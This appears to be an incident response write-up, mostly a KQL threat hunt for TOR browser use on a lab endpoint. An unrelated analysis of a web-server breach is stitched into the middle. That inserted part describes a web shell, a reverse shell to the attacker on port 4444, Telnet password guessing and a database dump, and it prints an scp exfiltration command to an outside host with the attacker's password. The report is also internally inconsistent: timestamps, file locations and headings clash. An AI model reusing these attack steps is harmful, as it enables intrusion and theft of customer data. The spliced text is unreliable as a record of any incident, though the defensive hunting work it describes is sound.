# Incident Response Report - Premium House Lights
- [Threat Scenario](scenario-PHL.md)

## Tools Leveraged
- Wireshark for packet analysis
- Log files

##  Scenario

Management suspects that some employees may be using TOR browsers to bypass network security controls because recent network logs show unusual encrypted traffic patterns and connections to known TOR entry nodes. Additionally, there have been anonymous reports of employees discussing ways to access restricted sites during work hours. The goal is to detect any TOR usage and analyze related security incidents to mitigate potential risks. If any use of TOR is found, notify management.


### High-Level TOR-Related IoC Discovery Plan

- **Check `DeviceFileEvents`** for any `tor(.exe)` or `firefox(.exe)` file events.
- **Check `DeviceProcessEvents`** for any signs of installation or usage.
- **Check `DeviceNetworkEvents`** for any signs of outgoing connections over known TOR ports.

---

## Steps Taken

### 1. Analysis of Webserver Logs

Searched for any file that had the string "tor" in it and discovered what looks like the user "employee" downloaded a TOR installer, did something that resulted in many TOR-related files being copied to the desktop, and the creation of a file called `tor-shopping-list.txt` on the desktop at `2025-02-05T21:57:08.5445515Z`. These events began at `2025-02-05T21:36:20.8753533Z`.

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "threat-hunt-lab"
| where InitiatingProcessAccountName == "employee"
| where FileName contains "tor"
| where Timestamp >= datetime(2025-02-05T21:36:20.8753533Z)
| order by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, Account = InitiatingProcessAccountName
```
![image](https://github.com/user-attachments/assets/d0bf7915-5078-4dec-a463-78d89f6aa449)


---

### 2. Searched the `DeviceProcessEvents` Table

Searched for any `ProcessCommandLine` that contained the string "tor-browser-windows-x86_64-portable-14.0.5.exe". Based on the logs returned, at `2025-02-05T21:38:29.9122643Z`, an employee on the "threat-hunt-lab" device ran the file `tor-browser-windows-x86_64-portable-14.0.5.exe` from their Downloads folder, using a command that triggered a silent installation.

**Query used to locate event:**

```kql

DeviceProcessEvents
| where DeviceName == "threat-hunt-lab"
| where ProcessCommandLine contains "tor-browser-windows-x86_64-portable-14.0.5.exe"
| project Timestamp, DeviceName, AccountName, ActionType, FileName, FolderPath, SHA256, ProcessCommandLine
```
![image](https://github.com/user-attachments/assets/36112462-3652-458d-96da-b5037ac03080)


---

### 3. Searched the `DeviceProcessEvents` Table for TOR Browser Execution

Searched for any indication that user "employee" actually opened the TOR browser. There was evidence that they did open it at `2025-02-05T21:39:29.3972508Z`. There were several other instances of `firefox.exe` (TOR) as well as `tor.exe` spawned afterwards.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "threat-hunt-lab"
| where FileName has_any ("tor.exe", "firefox.exe", "tor-browser.exe")
| project Timestamp, DeviceName, AccountName, ActionType, FileName, FolderPath, SHA256, ProcessCommandLine
| order by Timestamp desc
```
![image](https://github.com/user-attachments/assets/1a30f4c9-b824-45f2-8b04-f02efc595f1e)

---

### 4. Searched the `DeviceNetworkEvents` Table for TOR Network Connections

Searched for any indication the TOR browser was used to establish a connection using any of the known TOR ports. At `2025-02-05T21:39:55.3308187Z`, an employee on the "threat-hunt-lab" device successfully established a connection to the remote IP address `176.198.159.33` on port `9001`. The connection was initiated by the process `tor.exe`, located in the folder `c:\users\employee\desktop\tor browser\browser\torbrowser\tor\tor.exe`. There were a couple of other connections to sites over port `443`.

**Query used to locate events:**

```kql
DeviceNetworkEvents
| where DeviceName == "threat-hunt-lab"
| where InitiatingProcessAccountName != "system"
| where InitiatingProcessFileName in ("tor.exe", "firefox.exe")
| where RemotePort in ("9001", "9030", "9040", "9050", "9051", "9150", "443", "80")
| project Timestamp, DeviceName, InitiatingProcessAccountName, ActionType, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessFileName
| order by Timestamp desc
```
![image](https://github.com/user-attachments/assets/2dccf940-1fbb-48fd-934e-f129a22d8511)

---

## Technical Analysis

### Sitechecker Bot Crawler

This tool was first utilized to crawl the premiumhouselight.com domain to “automatically discover and scan websites by following links from one webpage to another” (Sitechecker, 2023). It may have been used by the attacker for reconnaissance purposes, to gain insight into accessible URLs and identify potentially exploitable pages, such as hidden directories or admin panels.

### Discovery of Uploads Directory and upload.php

Multiple HTTP 404 (page not found) responses for requests to various directories on the web server are experienced in a very short period of time, likely indicating a directory brute-force attack to find hidden pages. 
Through an HTTP 301(moved permanently) response on a request to the /uploads directory, the attacker IP 138.68.92.163 confirms the existence of a uploads directory, and now knows its new location according to this Wireshark capture: 
In addition, the attacker also discovers “upload.php” in the root directory:

Based on the HTML content, it is discovered that this is a form used for uploading files onto the web server. Given its name, it can be inferred that any files uploaded through its use would be sent to the server’s /uploads/ directory.

### Remote Access to Web Server

Shortly after, the attacker is met with a successful response for a request to the uploads directory:

The screenshot shows the index of the /uploads/ directory, and reveals the existence of “shell.php” with a timestamp of 2022-02-20 01:54 (after conversion to UTC time). This likely indicates that this file was present within this directory even before the attacker infiltrated the server.

Wireshark reveals the following information about the subsequent POST request targeting the shell.php file on the web server:

This indicates that shell.php is a web shell and prompts the user to execute a command. In addition, the line-based text data relating to the POST request reveals an attempt to run a reverse shell command using Python, for the purposes of being able to initiate an outgoing connection with the attacker and “execute commands remotely on the [web server]”(Imperva, 2023). In this case, the web server is being set up to listen for IP 138.68.92.163 (the attacker) on port 4444, which is often used for eavesdropping and receiving data from compromised systems (SOCRadar, 2022). 

### Discovery of Database and Open Port 22 and 23

An ARP Ping Scan performed on the web server (now remotely accessed by the attacker), reveals the database IP and MAC address. 

In addition, a TCP port scan was run which discovered that port 22 and 23 were open on the database; the presence of SYN, ACK packets observed on Wireshark confirms this. 
By default, port 22 is dedicated to Secure Shell (SSH), which allows for secure connection to remote devices. Port 23 is the default port for Telnet, which also grants remote access to systems, however the data transmitted is not encrypted and is instead sent in plaintext (Fitzgibbons, 2023). 

### Remote Access into the Database with Telnet

Immediately after, the attacker utilizes Telnet to attempt to remotely access the database as demonstrated by the failed login attempts captured on Wireshark:

Wireshark analysis of Telnet packets revealed that the attacker attempted 4 different username/password combinations to log in:
- admin/admin
- administrator/admin
- phl/phl
- phl/phl123 (successful)

### Exfiltrating Customer Information from the Database

Upon gaining access to the database, the attacker runs several commands on its shell:
- **sudo -l** -
This command shows the commands available to the phl user operating with superuser or root privileges

In this screenshot, the attacker has access to two different commands: mysql and mysqldump. In both cases, they are able to run the command as root without requiring a password.

- **sudo mysql -u root -p** -
This command runs mysql to connect to the MySQL server as the root user, and prompts the attacker for a password. However, because they ran the command with superuser privileges, no password is required as explained in the previous screenshot.

With access to the MySQL server, the attacker runs a number of different MySQL queries to investigate. In particular, they searched the “phl” database and discovered a table containing customer information:

They then perform the query “SELECT * FROM customers” to view the table, revealing information about the company’s customer information:

- **sudo mysqldump -u root -p phl > phl.db** - The attacker then runs this command to create a dump of the “phl” database containing the customer information into a file named “phl.db.” It is saved to the default directory.
- **scp phl.db fierce@178.62.228.28:/tmp/phl.db** - This command utilizes secure copy to “securely copy files and directories between two locations” (Linuxize, 2023) using the SSH protocol.
According to the command syntax, phl.db is the path of the source file located on the database, which is copied to the attacker’s (fierce@178.62.228.28) /tmp/ directory.
The attacker is prompted for their password (fierce123) before transfer of data is conducted.


---

## Chronological Event Timeline 

![Image](https://github.com/user-attachments/assets/73e09489-724e-4c9b-a384-3568e15ddd43)

### **1️⃣ Tor Browser Download**
- **🕒 Timestamp:** `2025-02-05T16:36:20 UTC`
- **📂 Event Type:** File Download
- **💻 Device:** `threat-hunt-lab`
- **👤 User:** `employee`
- **🔍 Details:**
  - The file **"tor-browser-windows-x86_64-portable-14.0.5.exe"** was **downloaded** into the **Downloads** folder.
  - This indicates **intentional** acquisition of the Tor browser.

---

### **2️⃣ Tor Browser Installation**
- **🕒 Timestamp:** `2025-02-05T16:38:29 UTC`
- **📂 Event Type:** Process Execution (Installation)
- **💻 Device:** `threat-hunt-lab`
- **👤 User:** `employee`
- **🔍 Details:**
  - The user executed **"tor-browser-windows-x86_64-portable-14.0.5.exe"** with the **"/S"** flag (**silent installation**).
  - **File Hash (SHA256):** `c5bb78b482300188ab228ed36251ab1ef208cc48a0a50864f2db7454debfc04e`
  - The installation was performed inside the **Downloads** folder.

---

### **3️⃣ Creation of Tor Browser Files**
- **🕒 Timestamp:** `2025-02-05T16:39:00 UTC`
- **📂 Event Type:** File Creation
- **💻 Device:** `threat-hunt-lab`
- **👤 User:** `employee`
- **🔍 Details:**
  - Several **Tor-related configuration files** were created:
    - `Tor-Launcher.txt`
    - `Torbutton.txt`
    - `Tor.txt`
  - These files were stored inside:  
    **`C:\Users\employee\Desktop\Tor Browser\Browser\`**
  - Indicates **successful installation and configuration** of Tor.

---

### **4️⃣ Tor Browser Execution**
- **🕒 Timestamp:** `2025-02-05T16:39:29 UTC`
- **📂 Event Type:** Process Execution
- **💻 Device:** `threat-hunt-lab`
- **👤 User:** `employee`
- **🔍 Details:**
  - The user **launched** `tor.exe`, initiating the **Tor browser**.
  - Multiple **firefox.exe** processes (Tor-based) were created, confirming active usage.

---

### **5️⃣ Establishing Tor Network Connections**
- **🕒 Timestamp:** `2025-02-05T16:39:55 - 16:40:06 UTC`
- **📂 Event Type:** Network Connection
- **💻 Device:** `threat-hunt-lab`
- **👤 User:** `employee`
- **🔍 Details:**
  - The **tor.exe** process established connections to known **Tor relay nodes**:
    - **88.99.142.177:9001**
    - **176.198.159.33:9001**
    - **127.0.0.1:9150** (local proxy connection)
    - **94.23.88.117:443** (HTTPS)
  - The browser accessed **Tor-specific URLs**, such as:
    - `https://www.xmh4xtbgfzpy3em.com`
    - `https://www.mhvt.com`
    - `https://www.wfb4ikugupgn4.com`
  - Confirms **successful Tor network access**.

---

### **6️⃣ Suspicious File Creation: "tor-shopping-list.txt"**
- **🕒 Timestamp:** `2025-02-05T16:57:08 UTC`
- **📂 Event Type:** File Created
- **💻 Device:** `threat-hunt-lab`
- **👤 User:** `employee`
- **🔍 Details:**
  - A file named **"tor-shopping-list.txt"** was created inside:
    - **`C:\Users\employee\Documents\`**
  - This file could contain **details related to Tor activity**, such as:
    - **Visited sites**
    - **Credentials**
    - **Planned actions**
  - **Further analysis recommended** to determine its content.

---

## Summary

The user "employee" on the "threat-hunt-lab" device initiated and completed the installation of the TOR browser. They proceeded to launch the browser, establish connections within the TOR network, and created various files related to TOR on their desktop, including a file named `tor-shopping-list.txt`. This sequence of activities indicates that the user actively installed, configured, and used the TOR browser, likely for anonymous browsing purposes, with possible documentation in the form of the "shopping list" file.

---

## Response Taken

TOR usage was confirmed on the endpoint `threat-hunt-lab` by the user `employee`. The device was isolated, and the user's direct manager was notified.

---
